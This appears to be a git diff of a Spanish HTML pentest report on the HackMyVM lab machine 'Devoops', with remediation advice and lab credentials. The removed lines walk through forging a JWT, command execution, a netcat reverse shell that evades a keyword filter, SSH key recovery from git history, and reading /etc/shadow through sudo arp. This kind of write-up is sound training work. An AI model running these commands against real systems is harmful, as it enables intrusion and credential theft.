-            <div class="vuln-name">JWT Forjado — Remote Code Execution</div>
-            <div class="vuln-cve">JWT Secret Exposure → Authenticated RCE</div>
-          </div>
-        </div>
-        <span class="sev-badge critical">● Crítico</span>
+      <div class="sidebar-card">
+        <h4>Detalles de la Máquina</h4>
+        <div class="detail-row"><span class="detail-label">Plataforma</span><span class="detail-value">HackMyVM</span></div>
+        <div class="detail-row"><span class="detail-label">Máquina</span><span class="detail-value green">Devoops</span></div>
+        <div class="detail-row"><span class="detail-label">OS</span><span class="detail-value">Alpine Linux</span></div>
+        <div class="detail-row"><span class="detail-label">Dificultad</span><span class="detail-value green">Fácil / Media</span></div>
+        <div class="detail-row"><span class="detail-label">IP Objetivo</span><span class="detail-value" style="font-family:monospace;font-size:11px;">10.0.2.12</span></div>
+        <div class="detail-row"><span class="detail-label">IP Atacante</span><span class="detail-value" style="font-family:monospace;font-size:11px;">10.0.2.4</span></div>
+        <div class="detail-row"><span class="detail-label">CVE Principal</span><span class="detail-value" style="font-size:11px;">CVE-2025-30208</span></div>
+        <div class="detail-row"><span class="detail-label">Estado</span><span class="detail-value green">✓ Rooted</span></div>
+        <div class="detail-row"><span class="detail-label">Fecha</span><span class="detail-value">17 Mar 2026</span></div>
       </div>
-      <div class="vuln-body">
-        <div class="vuln-grid">
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Componente afectado</div>
-            <div class="vuln-meta-value">Endpoint <code>/execute</code> (Express API)</div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Pre-requisito</div>
-            <div class="vuln-meta-value">JWT_SECRET obtenido por CVE-2025-30208</div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Impacto</div>
-            <div class="vuln-meta-value">Ejecución de comandos OS como usuario <code>runner</code></div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Bypass del filtro</div>
-            <div class="vuln-meta-value">Concatenación de cadenas (<code>n""c</code>, <code>s""h</code>)</div>
-          </div>
-        </div>
-        <p>Con el <code>JWT_SECRET</code> extraído del fichero <code>.env</code>, se forjó un token JWT con rol <code>admin</code>. El endpoint <code>/execute?cmd=</code> ejecuta comandos de sistema operativo. El filtro de comandos bloqueado se evade mediante concatenación de strings en bash (<code>n""c</code> → <code>nc</code>), técnica que no es detectada por la expresión regular del servidor.</p>
-        <div class="code-block">
-          <div class="code-bar"><span class="code-lang">bash — Explotación RCE</span><div class="code-dots"><span class="code-dot cd-r"></span><span class="code-dot cd-y"></span><span class="code-dot cd-g"></span></div></div>
-          <pre><span class="m"># Generar JWT admin con el secret extraído</span>
-<span class="c">python3 -c "import jwt,time; print(jwt.encode({'uid':0,'role':'admin','iat':int(time.time())}, '2942szKG7Ev83aDviugAa6rFpKixZzZz', 'HS256'))"</span>
-<span class="s">→ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsIn...</span>
 
-<span class="m"># Verificar RCE</span>
-<span class="c">curl -H "Authorization: Bearer &lt;TOKEN&gt;" "http://10.0.2.12:3000/execute?cmd=id"</span>
-<span class="s">→ {"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner)..."}}</span>
+      <div class="sidebar-card">
+        <h4>Habilidades Demostradas</h4>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Explotación Web (CVE)</span><span class="skill-pct">95%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">JWT Manipulation</span><span class="skill-pct">92%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Git Forensics</span><span class="skill-pct">88%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Linux Privesc (GTFOBins)</span><span class="skill-pct">90%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Filter Bypass</span><span class="skill-pct">85%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
+        </div>
+        <div class="skill-item">
+          <div class="skill-header"><span class="skill-name">Password Cracking</span><span class="skill-pct">87%</span></div>
+          <div class="skill-bar"><div class="skill-fill" style="width:87%"></div></div>
+        </div>
+      </div>
 
-<span class="m"># Reverse shell — bypass filtro con concatenación de strings</span>
-<span class="m"># "nc" bloqueado → "n""c" permitido; "sh" bloqueado → "s""h" permitido</span>
-<span class="c">curl -H "Authorization: Bearer &lt;TOKEN&gt;" "http://10.0.2.12:3000/execute?cmd=n%22%22c+10.0.2.4+1234+-e+s%22%22h"</span>
-<span class="s">→ Reverse shell recibida como runner (uid=1000)</span></pre>
+      <div class="sidebar-card">
+        <h4>Herramientas Utilizadas</h4>
+        <div class="tool-list">
+          <div class="tool-item"><span class="tool-icon">🔍</span>Nmap 7.98</div>
+          <div class="tool-item"><span class="tool-icon">📂</span>FFuf</div>
+          <div class="tool-item"><span class="tool-icon">🌐</span>curl</div>
+          <div class="tool-item"><span class="tool-icon">🐍</span>PyJWT</div>
+          <div class="tool-item"><span class="tool-icon">🔗</span>Netcat / socat</div>
+          <div class="tool-item"><span class="tool-icon">🐙</span>git</div>
+          <div class="tool-item"><span class="tool-icon">🔑</span>ssh</div>
+          <div class="tool-item"><span class="tool-icon">🔓</span>John the Ripper</div>
+          <div class="tool-item"><span class="tool-icon">📖</span>GTFOBins</div>
         </div>
       </div>
-    </div>
 
-    <!-- VULN 3 -->
-    <div class="vuln-card sev-high">
-      <div class="vuln-header">
-        <div class="vuln-title-group">
-          <div class="vuln-number">3</div>
-          <div>
-            <div class="vuln-name">Clave SSH Privada en Historial Git</div>
-            <div class="vuln-cve">Sensitive Data Exposure — Git History</div>
-          </div>
+      <div class="sidebar-card">
+        <h4>MITRE ATT&CK</h4>
+        <div class="mitre-list">
+          <div class="mitre-item"><span class="mitre-id">T1190</span><span class="mitre-name">Exploit Public-Facing Application</span></div>
+          <div class="mitre-item"><span class="mitre-id">T1552.001</span><span class="mitre-name">Unsecured Credentials: In Files</span></div>
+          <div class="mitre-item"><span class="mitre-id">T1059.004</span><span class="mitre-name">Unix Shell Execution</span></div>
+          <div class="mitre-item"><span class="mitre-id">T1552.004</span><span class="mitre-name">Private Keys</span></div>
+          <div class="mitre-item"><span class="mitre-id">T1548.003</span><span class="mitre-name">Abuse Elevation: Sudo</span></div>
+          <div class="mitre-item"><span class="mitre-id">T1110.002</span><span class="mitre-name">Password Cracking</span></div>
         </div>
-        <span class="sev-badge high">● Alto</span>
       </div>
-      <div class="vuln-body">
-        <div class="vuln-grid">
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Componente afectado</div>
-            <div class="vuln-meta-value">Repositorio Gitea — <code>/opt/gitea/git/hana/node.git</code></div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Datos expuestos</div>
-            <div class="vuln-meta-value">Clave privada ED25519 de usuario <code>hana</code></div>
-          </div>
-        </div>
-        <p>Un commit de Gitea titulado <em>"del: oops!"</em> eliminó una clave SSH privada que había sido añadida accidentalmente al repositorio en el commit anterior. Aunque el fichero fue borrado, el contenido permanece en el historial de git y es recuperable con <code>git show</code>. Esta clave permite autenticarse como el usuario <code>hana</code> por SSH (tras port-forward del puerto 22 interno).</p>
-        <div class="code-block">
-          <div class="code-bar"><span class="code-lang">bash — Extracción de la clave</span><div class="code-dots"><span class="code-dot cd-r"></span><span class="code-dot cd-y"></span><span class="code-dot cd-g"></span></div></div>
-          <pre><span class="m"># Copiar el repo bare a /tmp</span>
-<span class="c">cp -r /opt/gitea/git/hana/node.git /tmp/dotgit</span>
 
-<span class="m"># Ver commits</span>
-<span class="c">git --git-dir=/tmp/dotgit log --oneline</span>
-<span class="s">1994a70 del: oops!</span>
-<span class="s">02c0f91 init: init commit</span>
+      <div class="sidebar-card">
+        <h4>Índice de Contenido</h4>
+        <ul class="toc-list">
+          <li><a href="#resumen">1 — Resumen Ejecutivo</a></li>
+          <li><a href="#recon">2 — Reconocimiento</a></li>
+          <li><a href="#vulns">3 — Vulnerabilidades</a></li>
+          <li><a href="#cadena">4 — Cadena de Ataque</a></li>
+          <li><a href="#flags">5 — Flags y Evidencias</a></li>
+          <li><a href="#creds">6 — Credenciales</a></li>
+          <li><a href="#mitre">7 — MITRE ATT&CK</a></li>
+          <li><a href="#hardening">8 — Remediación</a></li>
+        </ul>
+      </div>
 
-<span class="m"># Extraer la clave del commit de borrado</span>
-<span class="c">git --git-dir=/tmp/dotgit show 1994a70</span>
-<span class="s">----- BEGIN OPENSSH PRIVATE KEY -----</span>
-<span class="s">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw...</span>
-<span class="s">----- END OPENSSH PRIVATE KEY -----</span>
-
-<span class="m"># Port-forward SSH (puerto 22 → 4444) y conexión como hana</span>
-<span class="c">socat TCP-LISTEN:4444,fork TCP:127.0.0.1:22 &amp;</span>
-<span class="c">ssh -i id_ed25519 hana@10.0.2.12 -p 4444</span>
-<span class="s">→ uid=1001(hana) gid=100(users) — Shell obtenida ✓</span></pre>
-        </div>
-      </div>
-    </div>
-
-    <!-- VULN 4 -->
-    <div class="vuln-card sev-high">
-      <div class="vuln-header">
-        <div class="vuln-title-group">
-          <div class="vuln-number">4</div>
-          <div>
-            <div class="vuln-name">Privilege Escalation — sudo arp + /etc/shadow</div>
-            <div class="vuln-cve">GTFOBins — sudo arp -f (file read) → password crack → root</div>
-          </div>
-        </div>
-        <span class="sev-badge high">● Alto</span>
-      </div>
-      <div class="vuln-body">
-        <div class="vuln-grid">
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Permiso sudo</div>
-            <div class="vuln-meta-value"><code>(root) NOPASSWD: /sbin/arp</code></div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Técnica</div>
-            <div class="vuln-meta-value">GTFOBins: <code>arp -f &lt;file&gt;</code> lee ficheros como root</div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Hash obtenido</div>
-            <div class="vuln-meta-value">SHA-512crypt (<code>$6$...</code>) de <code>root</code></div>
-          </div>
-          <div class="vuln-meta-item">
-            <div class="vuln-meta-label">Contraseña</div>
-            <div class="vuln-meta-value"><code>eris</code> (en rockyou.txt)</div>
-          </div>
-        </div>
-        <p>El usuario <code>hana</code> puede ejecutar <code>/sbin/arp</code> como root sin contraseña. El comando <code>arp -v -f &lt;fichero&gt;</code> intenta parsear el fichero como tabla ARP, imprimiendo línea a línea su contenido en la salida de error. Esto permite leer <code>/etc/shadow</code> y obtener el hash de la contraseña de root, que fue crackeado con rockyou.txt.</p>
-        <div class="code-block">
-          <div class="code-bar"><span class="code-lang">bash — Escalada a root</span><div class="code-dots"><span class="code-dot cd-r"></span><span class="code-dot cd-y"></span><span class="code-dot cd-g"></span></div></div>
-          <pre><span class="m"># Verificar permisos sudo</span>
-<span class="c">sudo -l</span>
-<span class="s">→ (root) NOPASSWD: /sbin/arp</span>
-
-<span class="m"># Leer /etc/shadow con sudo arp (GTFOBins)</span>
-<span class="c">sudo arp -v -f /etc/shadow 2&gt;&amp;1 | grep root</span>
-<span class="s">&gt;&gt; root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKET...</span>
-
-<span class="m"># Crackear hash con John / Hashcat</span>
-<span class="c">john --format=sha512crypt --wordlist=rockyou.txt hash.txt</span>
-<span class="s">→ eris             (root)</span>
-
-<span class="m"># Escalar a root</span>
-<span class="c">su root   → password: eris</span>
-<span class="s">→ uid=0(root) gid=0(root) — ROOT ✓</span></pre>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- ATTACK CHAIN -->
-  <section class="section">
-    <div class="section-label">05 — Cadena de Ataque</div>
-    <h2>Cadena de Ataque Completa</h2>
-
-    <div class="chain">
-      <div class="chain-step">
-        <div class="chain-icon">🔍</div>
-        <div class="chain-content">
-          <div class="chain-step-label">Paso 1 — Reconocimiento</div>
-          <div class="chain-step-title">Descubrimiento de superficie de ataque</div>
-          <div class="chain-step-desc">Nmap revela un único puerto abierto: <code>3000/tcp</code>. WhatWeb identifica <strong>Vite + Vue.js</strong>. FFuf descubre los endpoints <code>/server</code>, <code>/sign</code> y <code>/execute</code>. Al acceder a <code>/@vite/client</code> se confirma <strong>Vite 6.2</strong> — versión vulnerable a CVE-2025-30208.</div>
-        </div>
-      </div>
-      <div class="chain-step">
-        <div class="chain-icon">📄</div>
-        <div class="chain-content">
-          <div class="chain-step-label">Paso 2 — Lectura Arbitraria de Ficheros (CVE-2025-30208)</div>
-          <div class="chain-step-title">Extracción de secretos del sistema</div>
-          <div class="chain-step-desc">Añadiendo <code>?raw??</code> a la URL se leen ficheros arbitrarios del servidor. Se extraen <code>/etc/passwd</code> (usuarios del sistema), <code>.env</code> (<strong>JWT_SECRET = <code>2942szKG7Ev83aDviugAa6rFpKixZzZz</code></strong>) y <code>server.js</code> (lógica completa del backend: rutas, filtros de comandos).</div>
-        </div>
-      </div>
-      <div class="chain-step">
-        <div class="chain-icon">🔑</div>
-        <div class="chain-content">
-          <div class="chain-step-label">Paso 3 — JWT Forjado + RCE</div>
-          <div class="chain-step-title">Ejecución remota de comandos como runner</div>
-          <div class="chain-step-desc">Con el <code>JWT_SECRET</code> se firma un token con rol <code>admin</code>. El endpoint <code>/execute?cmd=</code> acepta el token y ejecuta comandos de sistema. El filtro de palabras clave se evade con concatenación de strings bash: <code>n""c</code> para <code>nc</code>, <code>s""h</code> para <code>sh</code>. Se obtiene una reverse shell como <strong>runner (uid=1000)</strong>.</div>
-        </div>
-      </div>
-      <div class="chain-step">
-        <div class="chain-icon">🐙</div>
-        <div class="chain-content">
-          <div class="chain-step-label">Paso 4 — Gitea + Git History</div>
-          <div class="chain-step-title">Recuperación de clave SSH privada eliminada</div>
-          <div class="chain-step-desc">Enumerando procesos se detecta <strong>Gitea</strong> corriendo como root. En <code>/opt/gitea/git/hana/node.git</code> se encuentra el repositorio bare. El commit <em>"del: oops!"</em> borró una clave SSH privada ED25519 del usuario <code>hana</code>, pero el contenido permanece en el historial git.</div>
-        </div>
-      </div>
-      <div class="chain-step">
-        <div class="chain-icon">🌀</div>
-        <div class="chain-content">
-          <div class="chain-step-label">Paso 5 — Port Forward + SSH</div>
-          <div class="chain-step-title">Acceso SSH como hana</div>
-          <div class="chain-step-desc">El puerto SSH 22 solo escucha en <code>127.0.0.1</code>. Se usa <code>socat</code> desde la shell de runner para exponerlo al exterior: <code>socat TCP-LISTEN:4444,fork TCP:127.0.0.1:22</code>. Con la clave ED25519 recuperada se conecta por SSH como <strong>hana (uid=1001)</strong> y se obtiene la <strong>user flag</strong>.</div>
-        </div>
-      </div>
-      <div class="chain-step">
-        <div class="chain-icon">⚡</div>
-        <div class="chain-content">
-          <div class="chain-step-label">Paso 6 — GTFOBins: sudo arp</div>
-          <div class="chain-step-title">Lectura de /etc/shadow y crackeo de contraseña</div>
-          <div class="chain-step-desc"><code>sudo -l</code> revela que <code>hana</code> puede ejecutar <code>/sbin/arp</code> como root sin contraseña. <code>arp -v -f /etc/shadow</code> imprime el contenido del fichero. Se extrae el hash SHA-512 de root: <code>$6$FGoCakO3/TPFyfOf$...</code>, crackeado con rockyou.txt → contraseña: <strong>eris</strong>.</div>
-        </div>
-      </div>
-      <div class="chain-step">
-        <div class="chain-icon">👑</div>
-        <div class="chain-content">
-          <div class="chain-step-label">Paso 7 — Root</div>
-          <div class="chain-step-title">Acceso total al sistema</div>
-          <div class="chain-step-desc"><code>su root</code> con la contraseña <code>eris</code>. Shell como <strong>root (uid=0)</strong>. Se obtiene la <strong>root flag</strong> y acceso completo al sistema.</div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- FLAGS -->
-  <section class="section">
-    <div class="section-label">06 — Flags Obtenidas</div>
-    <h2>Flags y Evidencias</h2>
-    <div class="grid-2">
-      <div class="flag-card">
-        <div class="flag-icon">🚩</div>
-        <div>
-          <div class="flag-label">User Flag</div>
-          <div class="flag-user">hana @ /home/hana/user.flag</div>
-          <span class="flag-value">flag{03d0e150ae9fc686a827b41e1969d497}</span>
-        </div>
-      </div>
-      <div class="flag-card">
-        <div class="flag-icon">👑</div>
-        <div>
-          <div class="flag-label">Root Flag</div>
-          <div class="flag-user">root @ /root/root.flag</div>
-          <span class="flag-value">flag{a834296543f4c2990909ce1c56becfba}</span>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- CREDENTIALS -->
-  <section class="section">
-    <div class="section-label">07 — Credenciales Comprometidas</div>
-    <h2>Credenciales Obtenidas</h2>
-    <div class="card">
-      <table class="creds-table">
-        <thead>
-          <tr>
-            <th>Usuario</th>
-            <th>Contraseña / Clave</th>
-            <th>Método de obtención</th>
-            <th>Acceso</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td><span class="cred-user">runner</span></td>
-            <td><span class="cred-pass">— (RCE directo)</span></td>
-            <td><span class="cred-method">JWT Forjado + RCE</span></td>
-            <td>Shell via reverse shell</td>
-          </tr>
-          <tr>
-            <td><span class="cred-user">hana</span></td>
-            <td><span class="cred-pass">id_ed25519 (SSH private key)</span></td>
-            <td><span class="cred-method">Git History</span></td>
-            <td>SSH port 4444 (forward)</td>
-          </tr>
-          <tr>
-            <td><span class="cred-user">root</span></td>
-            <td><span class="cred-pass">eris</span></td>
-            <td><span class="cred-method">shadow + JtR rockyou</span></td>
-            <td>su / SSH directo</td>
-          </tr>
-          <tr>
-            <td><span class="cred-user">JWT Secret</span></td>
-            <td><span class="cred-pass">2942szKG7Ev83aDviugAa6rFpKixZzZz</span></td>
-            <td><span class="cred-method">Vite File Read (.env)</span></td>
-            <td>Forja de tokens admin</td>
-          </tr>
-          <tr>
-            <td><span class="cred-user">gitea / hana</span></td>
-            <td><span class="cred-pass">saki</span></td>
-            <td><span class="cred-method">Nota en root.flag</span></td>
-            <td>Gitea web UI</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-  </section>
-
-  <!-- REMEDIATION -->
-  <section class="section">
-    <div class="section-label">08 — Remediación</div>
-    <h2>Recomendaciones de Remediación</h2>
-    <div class="card">
-      <div class="remed-item">
-        <div class="remed-num">1</div>
-        <div>
-          <div class="remed-title">No exponer servidores Vite en modo desarrollo en producción</div>
-          <div class="remed-desc">Actualizar Vite a ≥ 6.2.3 (fix de CVE-2025-30208) y nunca ejecutar <code>vite dev</code> en entornos accesibles desde la red. Usar builds de producción (<code>vite build</code>). Si es necesario exponer el dev server, configurar correctamente <code>server.allowedHosts</code> y añadir autenticación.</div>
-        </div>
-      </div>
-      <div class="remed-item">
-        <div class="remed-num">2</div>
-        <div>
-          <div class="remed-title">No almacenar secretos en ficheros .env accesibles por el servidor web</div>
-          <div class="remed-desc">El <code>JWT_SECRET</code> en <code>.env</code> fue directamente legible vía la vulnerabilidad de lectura de ficheros. Usar variables de entorno del sistema (no ficheros), servicios de secretos (Vault, AWS Secrets Manager) y nunca exponer <code>.env</code> en el docroot.</div>
-        </div>
-      </div>
-      <div class="remed-item">
-        <div class="remed-num">3</div>
-        <div>
-          <div class="remed-title">Limpiar secretos del historial git con git-filter-repo</div>
-          <div class="remed-desc">Usar <code>git filter-repo</code> o BFG Repo-Cleaner para eliminar permanentemente ficheros sensibles del historial. Rotar inmediatamente cualquier credencial que haya sido expuesta. Implementar pre-commit hooks con herramientas como <code>detect-secrets</code> o <code>truffleHog</code>.</div>
-        </div>
-      </div>
-      <div class="remed-item">
-        <div class="remed-num">4</div>
-        <div>
-          <div class="remed-title">Revisar y restringir permisos sudo</div>
-          <div class="remed-desc">Eliminar el permiso <code>(root) NOPASSWD: /sbin/arp</code> para el usuario <code>hana</code>. Auditar todos los permisos sudo con <code>sudo -l</code> para cada usuario. Aplicar el principio de mínimo privilegio — consultar GTFOBins para identificar binarios peligrosos.</div>
-        </div>
-      </div>
-      <div class="remed-item">
-        <div class="remed-num">5</div>
-        <div>
-          <div class="remed-title">Mejorar el filtrado de comandos con allowlisting</div>
-          <div class="remed-desc">El filtro de comandos basado en blacklist con regex de palabras clave es trivialmente evadible. Reemplazar por un modelo de allowlist estricto que solo permita comandos específicos y con parámetros validados. Considerar sandbox (seccomp, AppArmor, contenedores) para el proceso de ejecución.</div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <div class="divider"></div>
-
-  <!-- TOOLS USED -->
-  <section class="section">
-    <div class="section-label">09 — Herramientas</div>
-    <h2>Herramientas Utilizadas</h2>
-    <div>
-      <span class="tag">Nmap 7.98</span>
-      <span class="tag">FFuf</span>
-      <span class="tag">WhatWeb</span>
-      <span class="tag">curl</span>
-      <span class="tag">PyJWT</span>
-      <span class="tag">Netcat / ncat</span>
-      <span class="tag">socat</span>
-      <span class="tag">git</span>
-      <span class="tag">ssh</span>
-      <span class="tag">John the Ripper</span>
-      <span class="tag">Hashcat</span>
-      <span class="tag">rockyou.txt</span>
-      <span class="tag">GTFOBins</span>
-    </div>
-  </section>
-
-</div><!-- /container -->
+    </aside>
+  </div>
+</div>
 
 <footer>
-  Reporte generado por <strong>Claude Code</strong> — Pentest realizado el 17 de Marzo de 2026 &nbsp;|&nbsp;
-  Máquina: <strong>Devoops</strong> (HackMyVM) &nbsp;|&nbsp;
-  Objetivo: <strong>10.0.2.12</strong>
+  <div class="footer-name">Yoandy Ramirez Delgado</div>
+  <div>Analista de Ciberseguridad &amp; Pentester
+    <span class="footer-divider">·</span>
+    HackMyVM — Devoops
+    <span class="footer-divider">·</span>
+    Pentest Report
+    <span class="footer-divider">·</span>
+    Fácil / Media
+  </div>
+  <div style="margin-top:6px;font-size:12px;color:var(--text-muted);">
+    Writeup con fines educativos — HackMyVM.
+  </div>
 </footer>
 
 </body>
